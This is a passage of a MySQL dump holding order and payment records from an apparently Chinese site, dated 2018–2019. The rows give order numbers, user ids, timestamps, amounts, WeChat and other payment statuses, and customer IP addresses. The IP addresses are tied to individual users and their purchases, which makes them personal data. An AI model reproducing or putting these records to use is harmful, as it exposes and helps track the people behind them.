(195, '1528508544', '1528508544|165', 165, '2018-06-09 09:42:24', '124.135.235.0', 1009.99, '等待买家付款', '', '微信支付', 0, '149121862220180609094224', NULL, '126xcf', 10),
(196, '1528516380', '1528516380166880', 166, '2018-06-09 11:53:00', '222.125.4.59', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(197, '1528516397', '1528516397166685', 166, '2018-06-09 11:53:17', '222.125.4.59', 1.01, '等待买家付款', '', '微信支付', 0, '149121862220180609115317', NULL, NULL, 0.01),
(198, '1528516401', '1528516401166254', 166, '2018-06-09 11:53:21', '222.125.4.59', 1.01, '等待买家付款', '', '微信支付', 0, '149121862220180609115321', NULL, NULL, 0.01),
(199, '1528516402pay166', '1528516402|166', 166, '2018-06-09 11:53:22', '222.125.4.59', 1.01, '等待买家付款', '', '', 0, NULL, NULL, NULL, 0.01),
(200, '1528725253', '1528725253|168', 168, '2018-06-11 21:54:13', '113.57.245.217', 20.19, '等待买家付款', '', '', 0, NULL, NULL, '127xcf', NULL),
(201, '1528777473', '1528777473169299', 169, '2018-06-12 12:24:33', '49.77.1.221', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(202, '1528777495pay169', '1528777495|169', 169, '2018-06-12 12:24:55', '49.77.1.221', 1.01, '等待买家付款', '', '', 0, NULL, NULL, NULL, 0.01),
(203, '1529053488', '1529053488|170', 170, '2018-06-15 17:04:48', '113.101.62.12', 2019.99, '等待买家付款', '', '', 0, NULL, NULL, '128xcf', NULL),
(204, '1532522115pay173', '1532522115|173', 173, '2018-07-25 20:35:15', '111.1.220.146', 1.01, '等待买家付款', '', '', 0, NULL, NULL, NULL, 0.01),
(205, '1532522125', '1532522125173700', 173, '2018-07-25 20:35:25', '111.1.220.146', 1.01, '等待买家付款', '', '微信支付', 0, '149121862220180725203525', NULL, NULL, 0.01),
(206, '1532522129', '1532522129173767', 173, '2018-07-25 20:35:29', '111.1.220.146', 1.01, '等待买家付款', '', '微信支付', 0, '149121862220180725203530', NULL, NULL, 0.01),
(207, '1532522131', '153252213117393', 173, '2018-07-25 20:35:31', '111.1.220.146', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(208, '1532522187', '1532522187173213', 173, '2018-07-25 20:36:27', '111.1.220.146', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(209, '1532522194', '1532522194173966', 173, '2018-07-25 20:36:34', '111.1.220.146', 1.01, '等待买家付款', '', '微信支付', 0, '149121862220180725203634', NULL, NULL, 0.01),
(210, '1532522196', '1532522196173834', 173, '2018-07-25 20:36:36', '111.1.220.146', 1.01, '等待买家付款', '', '微信支付', 0, '149121862220180725203636', NULL, NULL, 0.01),
(211, '1532522198pay173', '1532522198|173', 173, '2018-07-25 20:36:38', '111.1.220.146', 1.01, '等待买家付款', '', '', 0, NULL, NULL, NULL, 0.01),
(212, '1532709637', '153270963715618', 15, '2018-07-28 00:40:37', '223.157.233.120', 10, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(213, '1532835630', '1532835630|186', 186, '2018-07-29 11:40:30', '110.184.76.132', 70.69, '等待买家付款', '', '', 0, NULL, NULL, '131xcf', 0.7),
(214, '1532850212pay187', '1532850212|187', 187, '2018-07-29 15:43:32', '39.176.69.25', 101, '等待买家付款', '', '', 0, NULL, NULL, NULL, 1),
(215, '1534872382pay188', '1534872382|188', 188, '2018-08-22 01:26:22', '223.157.250.178', 10.1, '等待买家付款', '', '', 0, NULL, NULL, NULL, 0.1),
(216, '1535570743', '153557074319445898', 194, '2018-08-30 03:25:43', '223.104.254.147', 20.19, 'wait', '', 'wx-h5', 0, NULL, NULL, '135xcf', 0.2),
(217, '1535570987', '1535570987|194', 194, '2018-08-30 03:29:47', '223.104.254.147', 20.19, '等待买家付款', '', '', 0, NULL, NULL, '135xcf', NULL),
(218, '1535909823', '1535909823195605', 195, '2018-09-03 01:37:03', '123.151.77.123', 100, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(219, '1535910175', '1535910175195514', 195, '2018-09-03 01:42:55', '123.151.77.123', 100, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(220, '1535910205pay195', '1535910205|195', 195, '2018-09-03 01:43:25', '123.151.77.123', 101, '等待买家付款', '', '', 0, NULL, NULL, NULL, 1),
(221, '1535910217', '1535910217195539', 195, '2018-09-03 01:43:37', '123.151.77.123', 100, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(222, '1535910339', '1535910339195827', 195, '2018-09-03 01:45:39', '123.151.77.123', 100, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(223, '1536300799', '1536300799|197', 197, '2018-09-07 14:13:19', '183.158.197.236', 59.58, '等待买家付款', '', '微信支付', 0, '149121862220180907141319', NULL, '137xcf', 0.59),
(224, '1537626725', '1537626725199115', 199, '2018-09-22 22:32:27', '134.175.9.114', 1, 'suc', 'TRADE_SUCCESS', 'otherpay', 1, NULL, NULL, NULL, NULL),
(225, '1537626769', '1537626769199328', 199, '2018-09-22 22:33:10', '134.175.9.114', 2, 'suc', 'TRADE_SUCCESS', 'otherpay', 1, NULL, NULL, NULL, NULL),
(226, '1538315391', '153831539115129', 15, '2018-09-30 21:49:51', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(227, '1538315508', '1538315508151', 15, '2018-09-30 21:51:48', '175.2.87.46', 10, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(228, '1538315605', '153831560515813', 15, '2018-09-30 21:53:25', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(229, '1538315757', '153831575715197', 15, '2018-09-30 21:55:57', '175.2.87.46', 10, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(230, '1538315920', '153831592015763', 15, '2018-09-30 21:58:40', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(231, '1538316003', '153831600315884', 15, '2018-09-30 22:00:03', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(232, '1538316267', '153831626715473', 15, '2018-09-30 22:04:27', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(233, '1538316586', '153831658615679', 15, '2018-09-30 22:09:46', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(234, '1538316758', '153831675815250', 15, '2018-09-30 22:12:38', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(235, '1538316772', '153831677215116', 15, '2018-09-30 22:12:52', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(236, '1538318081', '153831808115409', 15, '2018-09-30 22:34:41', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(237, '1538318101', '153831810115189', 15, '2018-09-30 22:35:01', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(238, '1538318141', '153831814115718', 15, '2018-09-30 22:35:41', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(239, '1538319648', '153831964815215', 15, '2018-09-30 23:00:48', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(240, '1538319829', '153831982915687', 15, '2018-09-30 23:03:49', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(241, '1538319924', '153831992415684', 15, '2018-09-30 23:05:24', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(242, '1538319929', '153831992915366', 15, '2018-09-30 23:05:29', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(243, '1538319932', '153831993215663', 15, '2018-09-30 23:05:32', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(244, '1538319936', '153831993615731', 15, '2018-09-30 23:05:36', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(245, '1538320045', '153832004515322', 15, '2018-09-30 23:07:25', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(246, '1538320144', '153832014415595', 15, '2018-09-30 23:09:04', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(247, '1538320290', '153832029015148', 15, '2018-09-30 23:11:30', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(248, '1538320335', '153832033515544', 15, '2018-09-30 23:12:15', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(249, '1538320386', '153832038615748', 15, '2018-09-30 23:13:06', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(250, '1538320612', '15383206121537', 15, '2018-09-30 23:16:52', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(251, '1538320625', '15383206251523', 15, '2018-09-30 23:17:05', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(252, '1538320663', '153832066315823', 15, '2018-09-30 23:17:43', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(253, '1538320774', '153832077415564', 15, '2018-09-30 23:19:34', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(254, '1538320792', '153832079215572', 15, '2018-09-30 23:19:52', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(255, '1538321122', '153832112215814', 15, '2018-09-30 23:25:22', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(256, '1538321140', '15383211401570', 15, '2018-09-30 23:25:40', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(257, '1538321163', '153832116315755', 15, '2018-09-30 23:26:03', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(258, '1538321184', '153832118415537', 15, '2018-09-30 23:26:24', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(259, '1538321204', '15383212041589', 15, '2018-09-30 23:26:44', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(260, '1538321384', '153832138415897', 15, '2018-09-30 23:29:44', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(261, '1538321409', '15383214091519', 15, '2018-09-30 23:30:09', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(262, '1538321423', '153832142315433', 15, '2018-09-30 23:30:23', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(263, '1538321610', '153832161015249', 15, '2018-09-30 23:33:30', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(264, '1538321624', '153832162415209', 15, '2018-09-30 23:33:44', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(265, '1538321645', '153832164515832', 15, '2018-09-30 23:34:05', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(266, '1538321669', '153832166915660', 15, '2018-09-30 23:34:29', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(267, '1538321748', '153832174815222', 15, '2018-09-30 23:35:48', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(268, '1538321900pay15', '1538321900|15', 15, '2018-09-30 23:38:20', '175.2.87.46', 1.01, '等待买家付款', '', '', 0, NULL, NULL, NULL, 0.01),
(269, '1538321906pay15', '1538321906|15', 15, '2018-09-30 23:38:26', '175.2.87.46', 1.01, '等待买家付款', '', '', 0, NULL, NULL, NULL, 0.01),
(270, '1538322087pay15', '1538322087|15', 15, '2018-09-30 23:41:27', '175.2.87.46', 1.01, '等待买家付款', '', '', 0, NULL, NULL, NULL, 0.01),
(271, '1538322102pay15', '1538322102|15', 15, '2018-09-30 23:41:42', '175.2.87.46', 1.01, '等待买家付款', '', '', 0, NULL, NULL, NULL, 0.01),
(272, '1538322153', '153832215315430', 15, '2018-09-30 23:42:33', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(273, '1538322181', '153832218115275', 15, '2018-09-30 23:43:01', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(274, '1538322240', '153832224015886', 15, '2018-09-30 23:44:00', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(275, '1538322321', '153832232115826', 15, '2018-09-30 23:45:21', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(276, '1538322350', '153832235015705', 15, '2018-09-30 23:45:50', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(277, '1538323715pay15', '1538323715|15', 15, '2018-10-01 00:08:35', '175.2.87.46', 11.11, '等待买家付款', '', '', 0, NULL, NULL, NULL, 0.11),
(278, '1538323719', '153832371915477', 15, '2018-10-01 00:08:39', '175.2.87.46', 11, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(279, '1538323748', '153832374815280', 15, '2018-10-01 00:09:08', '175.2.87.46', 11, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(280, '1538323778', '153832377815636', 15, '2018-10-01 00:09:38', '175.2.87.46', 11, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(281, '1538323812', '153832381215751', 15, '2018-10-01 00:10:12', '175.2.87.46', 11, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(282, '1538323842', '153832384215487', 15, '2018-10-01 00:10:42', '175.2.87.46', 11, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(283, '1538323856', '153832385615354', 15, '2018-10-01 00:10:56', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(284, '1538323892', '153832389215814', 15, '2018-10-01 00:11:32', '175.2.87.46', 11, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(285, '1538323916', '153832391615781', 15, '2018-10-01 00:11:56', '175.2.87.46', 11, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(286, '1538324306', '153832430615781', 15, '2018-10-01 00:18:26', '175.2.87.46', 11, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(287, '1538324316', '153832431615264', 15, '2018-10-01 00:18:36', '175.2.87.46', 11, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(288, '1538325273', '153832527315230', 15, '2018-10-01 00:34:33', '175.2.87.46', 11, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(289, '1538325309', '153832530915753', 15, '2018-10-01 00:35:09', '175.2.87.46', 11, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(290, '1538325329', '153832532915830', 15, '2018-10-01 00:35:29', '175.2.87.46', 11, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(291, '1538325616', '153832561615469', 15, '2018-10-01 00:40:16', '175.2.87.46', 11, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(292, '1538325665', '153832566515724', 15, '2018-10-01 00:41:05', '175.2.87.46', 11, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(293, '1538325703', '153832570315159', 15, '2018-10-01 00:41:43', '175.2.87.46', 11, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(294, '1538325721', '153832572115917', 15, '2018-10-01 00:42:01', '175.2.87.46', 11, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(295, '1538325746', '153832574615327', 15, '2018-10-01 00:42:26', '175.2.87.46', 11, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(296, '1538325842', '153832584215597', 15, '2018-10-01 00:44:02', '175.2.87.46', 11, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(297, '1538325857', '153832585715649', 15, '2018-10-01 00:44:17', '175.2.87.46', 11, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(298, '1538325926', '153832592615986', 15, '2018-10-01 00:45:26', '175.2.87.46', 11, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(299, '1538326019', '15383260191572', 15, '2018-10-01 00:46:59', '175.2.87.46', 11, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(300, '1538326062', '153832606215996', 15, '2018-10-01 00:47:42', '175.2.87.46', 11, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(301, '1538326114', '153832611415248', 15, '2018-10-01 00:48:34', '175.2.87.46', 11, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(302, '1538326161', '153832616115161', 15, '2018-10-01 00:49:21', '175.2.87.46', 11, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(303, '1538326192', '153832619215101', 15, '2018-10-01 00:49:52', '175.2.87.46', 11, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(304, '1538326218', '153832621815288', 15, '2018-10-01 00:50:18', '175.2.87.46', 11, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(305, '1538326260', '153832626015833', 15, '2018-10-01 00:51:00', '175.2.87.46', 11, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(306, '1538326268', '153832626815951', 15, '2018-10-01 00:51:08', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(307, '1538326293', '153832629315571', 15, '2018-10-01 00:51:33', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(308, '1538326307', '153832630715407', 15, '2018-10-01 00:51:47', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(309, '1538326326', '15383263261518', 15, '2018-10-01 00:52:06', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(310, '1538326335', '153832633515949', 15, '2018-10-01 00:52:15', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(311, '1538326399', '153832639915781', 15, '2018-10-01 00:53:19', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(312, '1538326444', '153832644415251', 15, '2018-10-01 00:54:04', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(313, '1538326460', '153832646015108', 15, '2018-10-01 00:54:20', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(314, '1538326473', '153832647315540', 15, '2018-10-01 00:54:33', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(315, '1538326498', '153832649815268', 15, '2018-10-01 00:54:58', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(316, '1538326704', '153832670415489', 15, '2018-10-01 00:58:24', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(317, '1538326741', '153832674115246', 15, '2018-10-01 00:59:01', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(318, '1538326746', '153832674615619', 15, '2018-10-01 00:59:06', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(319, '1538326762', '153832676215138', 15, '2018-10-01 00:59:22', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(320, '1538326991', '153832699115942', 15, '2018-10-01 01:03:11', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(321, '1538327019', '153832701915539', 15, '2018-10-01 01:03:39', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(322, '1538327183', '153832718315336', 15, '2018-10-01 01:06:23', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(323, '1538327276', '153832727615348', 15, '2018-10-01 01:07:56', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(324, '1538327285', '153832728515442', 15, '2018-10-01 01:08:05', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(325, '1538327359', '153832735915496', 15, '2018-10-01 01:09:19', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(326, '1538328274', '153832827415564', 15, '2018-10-01 01:24:34', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(327, '1538328988', '15383289881579', 15, '2018-10-01 01:36:28', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(328, '1538328994', '153832899415692', 15, '2018-10-01 01:36:34', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(329, '1538329227', '15383292271548', 15, '2018-10-01 01:40:27', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(330, '1538329259', '153832925915725', 15, '2018-10-01 01:40:59', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(331, '1538329281', '153832928115875', 15, '2018-10-01 01:41:21', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(332, '1538329293', '153832929315163', 15, '2018-10-01 01:41:33', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(333, '1538329422', '153832942215292', 15, '2018-10-01 01:43:42', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(334, '1538329440', '153832944015758', 15, '2018-10-01 01:44:00', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(335, '1538329493', '153832949315733', 15, '2018-10-01 01:44:53', '175.2.87.46', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(336, '1538329511', '153832951115126', 15, '2018-10-01 01:46:00', '193.112.76.14', 1, 'suc', 'TRADE_SUCCESS', 'otherpay', 1, NULL, NULL, NULL, NULL),
(337, '1538330046pay204', '1538330046|204', 204, '2018-10-01 01:54:06', '175.2.87.46', 1.01, '等待买家付款', '', '', 0, NULL, NULL, NULL, 0.01),
(338, '1538330055', '153833005520482', 204, '2018-10-01 01:54:29', '193.112.76.14', 1, 'suc', 'TRADE_SUCCESS', 'otherpay', 1, NULL, NULL, NULL, NULL),
(339, '1538330096', '1538330096204762', 204, '2018-10-01 01:55:19', '193.112.76.14', 1, 'suc', 'TRADE_SUCCESS', 'otherpay', 1, NULL, NULL, NULL, NULL),
(340, '1538330133', '1538330133204632', 204, '2018-10-01 01:56:15', '193.112.76.14', 1, 'suc', 'TRADE_SUCCESS', 'otherpay', 1, NULL, NULL, NULL, NULL),
(341, '1538662438pay205', '1538662438|205', 205, '2018-10-04 22:13:58', '39.181.177.19', 10.1, '等待买家付款', '', '', 0, NULL, NULL, NULL, 0.1),
(342, '1538662444', '1538662444205340', 205, '2018-10-04 22:14:04', '39.181.177.19', 10.1, '等待买家付款', '', '微信支付', 0, '149121862220181004221405', NULL, NULL, 0.1),
(343, '1538662448', '153866244820596', 205, '2018-10-04 22:14:08', '39.181.177.19', 10.1, '等待买家付款', '', '微信支付', 0, '149121862220181004221408', NULL, NULL, 0.1),
(344, '1538662450', '1538662450205516', 205, '2018-10-04 22:14:10', '39.181.177.19', 10, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(345, '1538666340', '1538666340206866', 206, '2018-10-04 23:19:00', '223.73.86.181', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(346, '1539326904', '1539326904|209', 209, '2018-10-12 14:48:24', '59.51.4.225', 504.99, '等待买家付款', '', '', 0, NULL, NULL, '139xcf', 5),
(347, '1539326923', '1539326923|209', 209, '2018-10-12 14:48:43', '59.51.4.225', 504.99, '等待买家付款', '', '', 0, NULL, NULL, '139xcf', 5),
(348, '1539356455', '1539356455210545', 210, '2018-10-12 23:00:55', '222.242.69.158', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(349, '1539356463', '1539356463210371', 210, '2018-10-12 23:01:03', '222.242.69.158', 1.01, '等待买家付款', '', '微信支付', 0, '149121862220181012230104', NULL, NULL, 0.01),
(350, '1539356472', '1539356472210626', 210, '2018-10-12 23:01:12', '222.242.69.158', 1.01, '等待买家付款', '', '微信支付', 0, '149121862220181012230112', NULL, NULL, 0.01),
(351, '1539356476pay210', '1539356476|210', 210, '2018-10-12 23:01:16', '222.242.69.158', 1.01, '等待买家付款', '', '', 0, NULL, NULL, NULL, 0.01),
(352, '1542525702pay217', '1542525702|217', 217, '2018-11-18 15:21:42', '223.88.38.105', 112.11, '等待买家付款', '', '', 0, NULL, NULL, NULL, 1.11),
(353, '1544510333', '1544510333|220', 220, '2018-12-11 14:38:53', '111.227.7.37', 5.04, '等待买家付款', '', '微信支付', 0, '149121862220181211143853', NULL, '146xcf', 0.05),
(354, '1545581137', '154558113715743', 15, '2018-12-24 00:05:37', '223.157.173.113', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(355, '1551006850', '1551006850228901', 228, '2019-02-24 19:14:10', '223.74.105.224', 1.01, '等待买家付款', '', '微信支付', 0, '220190224191411', NULL, NULL, 0.01),
(356, '1551006894', '155100689422811', 228, '2019-02-24 19:14:54', '223.74.105.224', 11.11, '等待买家付款', '', '微信支付', 0, '152661196120190224191454', NULL, NULL, 0.11),
(357, '1551006936', '1551006936228950', 228, '2019-02-24 19:15:36', '223.74.105.224', 1.01, '等待买家付款', '', '微信支付', 0, '152661196120190224191537', NULL, NULL, 0.01),
(358, '1551006966', '1551006966228394', 228, '2019-02-24 19:16:06', '223.74.105.224', 1.01, '等待买家付款', '', '微信支付', 0, '149121862220190224191606', NULL, NULL, 0.01),
(359, '1551007003', '1551007003228667', 228, '2019-02-24 19:16:43', '223.74.105.224', 1.01, '等待买家付款', '', '微信支付', 0, '149121862220190224191643', NULL, NULL, 0.01),
(360, '1551007278', '15510072782282', 228, '2019-02-24 19:21:18', '223.74.105.224', 1.01, '等待买家付款', '', '微信支付', 0, '149121862220190224192118', NULL, NULL, 0.01),
(361, '1551012219pay230', '1551012219|230', 230, '2019-02-24 20:43:39', '121.35.0.170', 11.11, '等待买家付款', '', '', 0, NULL, NULL, NULL, 0.11),
(362, '1551381791', '155138179123252817', 232, '2019-03-01 03:23:11', '113.200.205.3', 100, 'wait', '', 'wx-H5', 0, NULL, NULL, NULL, 1),
(363, '1551381801', '1551381801232344', 232, '2019-03-01 03:23:21', '113.96.219.243', 100, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL);
INSERT INTO `yjcode_dingdang` (`id`, `bh`, `ddbh`, `userid`, `sj`, `uip`, `money1`, `ddzt`, `alipayzt`, `bz`, `ifok`, `wxddbh`, `jyh`, `carid`, `sxf`) VALUES
(364, '1551409658', '1551409658233445', 233, '2019-03-01 11:07:38', '39.185.119.23', 10, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(365, '1551409679', '1551409679233775', 233, '2019-03-01 11:07:59', '39.185.119.23', 10.1, '等待买家付款', '', '微信支付', 0, '149121862220190301110759', NULL, NULL, 0.1),
(366, '1551409686', '1551409686233206', 233, '2019-03-01 11:08:06', '39.185.119.23', 10.1, '等待买家付款', '', '微信支付', 0, '149121862220190301110806', NULL, NULL, 0.1),
(367, '1551416871pay233', '1551416871|233', 233, '2019-03-01 13:07:51', '39.188.255.134', 10.1, '等待买家付款', '', '', 0, NULL, NULL, NULL, 0.1),
(368, '1551416878', '155141687823312', 233, '2019-03-01 13:07:58', '39.188.255.134', 10.1, '等待买家付款', '', '微信支付', 0, '149121862220190301130758', NULL, NULL, 0.1),
(369, '1551416883', '1551416883233625', 233, '2019-03-01 13:08:03', '39.188.255.134', 10.1, '等待买家付款', '', '微信支付', 0, '149121862220190301130803', NULL, NULL, 0.1),
(370, '1551416885', '1551416885233445', 233, '2019-03-01 13:08:05', '39.188.255.134', 10, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(371, '1553259386', '1553259386|199', 199, '2019-03-22 20:56:26', '120.229.2.131', 3632.96, '等待买家付款', '', '微信支付', 0, '149121862220190322205627', NULL, '150xcf', 35.97),
(372, '1553260596', '1553260596|199', 199, '2019-03-22 21:16:36', '120.229.2.131', 7268.96, '等待买家付款', '', '微信支付', 0, '149121862220190322211638', NULL, '156xcf150xcf', 71.97),
(373, '1553776739pay237', '1553776739|237', 237, '2019-03-28 20:38:59', '110.52.7.120', 101, '等待买家付款', '', '', 0, NULL, NULL, NULL, 1),
(374, '1553776751', '1553776751237181', 237, '2019-03-28 20:39:11', '110.52.7.120', 100, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(375, '1553776767', '1553776767237972', 237, '2019-03-28 20:39:27', '110.52.7.120', 101, '等待买家付款', '', '微信支付', 0, '149121862220190328203927', NULL, NULL, 1),
